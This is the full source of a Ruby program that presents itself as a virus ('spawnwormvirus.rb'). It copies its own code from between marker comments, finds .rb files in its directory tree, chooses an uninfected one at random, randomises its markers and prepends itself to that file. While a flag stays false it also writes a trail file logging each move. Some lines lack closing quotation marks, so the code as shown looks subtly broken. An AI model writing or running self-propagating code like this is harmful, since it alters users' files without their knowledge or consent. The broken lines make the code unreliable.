##821123##
resdir = C:/Users/House/Desktop/spawnwormvirus.rb
begs = "##821" + "123##
ends = "##964" + "525##
$malicious = false
file = File.open(resdir,"r")
filec = file.read.to_s
file.close    
str1 = begs.to_s
str2 = ends.to_s
vc = filec.to_s[/#{str1}(.*?)#{str2}/m, 1].to_s
vc = vc.split("\n")
files = []
remaining_directories = [resdir.split("/")[0..-2].join("/").to_s]
until remaining_directories.length.to_i == 0
  cd = remaining_directories[0]
  begin
    Dir.foreach(cd) do |d|
      if d.to_s != "." and d.to_s != ".."
        if File.file?(cd.to_s + "/" + d.to_s) and d.to_s.include?(".rb")
	      files << cd.to_s + "/" + d.to_s  
        elsif File.directory?(cd.to_s + "/" + d.to_s)
	      remaining_directories << cd.to_s + "/" + d.to_s
        end
      end
    end
  rescue
  end	  
  remaining_directories.delete_at(0)
end
gf = false
loop do
  i = rand(files.length.to_i).to_i
  file = files[i].to_s
  files.delete_at(i)
  f = File.open(file,"rb")
  fc = f.read.to_s
  f.close
  if fc.to_s.split("\n")[1].to_s.split(" = ")[0].to_s != "resdir"
    break
  else
    file = false
  end
end
puts "SELECTED FILE: " + file.to_s
vc[1] = "resdir = " + file.to_s
bs = ""
es = ""
6.times { bs << rand(10).to_s }
6.times { es << rand(10).to_s }
bs = "##" + bs.to_s + "##"
es = "##" + es.to_s + "##"
vc[2] = "begs = \"" + bs[0..4].to_s + "\" + \"" + bs[5..-1].to_s 
vc[3] = "ends = \"" + es[0..4].to_s + "\" + \"" + es[5..-1].to_s 
vc[0] = bs
vc << es.to_s
nvc = []
vc.each do |l|
  if l.ord != 10 and l.ord != 13
    nvc << l.to_s
  end
end
vc = nvc.join("\n").to_s
puts "ABOUT TO MOVE TO: " + file.to_s
f = File.open(file.to_s,"r")
fc = f.read.to_s
f.close
fc = vc.to_s + "\n" + fc.to_s
puts "NEW HOME IMAGE: " + fc.to_s
f = File.open(file.to_s,"w")
f.write(fc.to_s)
f.close
move_time = Time.now.to_s.split(" ")[0..1].join(".").split(":").join(".").split("-").join(".").to_s
unless $malicious
  f = File.open(resdir.to_s.split("/")[0..-2].join("/").to_s + "/trail.txt","w")
  trail = "Virus moved from: " + resdir.to_s + " to: " + file.to_s + " @ " + move_time.to_s
  f.write(trail.to_s)
  f.close
end
##964525##